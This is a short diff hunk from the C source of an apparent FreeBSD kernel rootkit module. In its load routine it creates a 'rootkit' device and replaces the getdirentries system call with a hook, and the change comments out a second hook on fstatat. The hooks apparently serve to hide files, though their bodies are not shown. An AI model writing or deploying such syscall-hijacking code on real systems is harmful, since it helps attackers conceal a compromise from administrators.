@@ -385,7 +385,7 @@ static int load(module_t module, int cmd, void *arg) {
         /* Initialize character device interface via interface.c */
         error = make_rootkit_dev();
         sysent[SYS_getdirentries].sy_call = (sy_call_t *) getdirentries_hook;
-        sysent[SYS_fstatat].sy_call = (sy_call_t *) fstatat_hook;
+        // sysent[SYS_fstatat].sy_call = (sy_call_t *) fstatat_hook;
 
         if (error == 0) {
             struct proc *p = NULL;
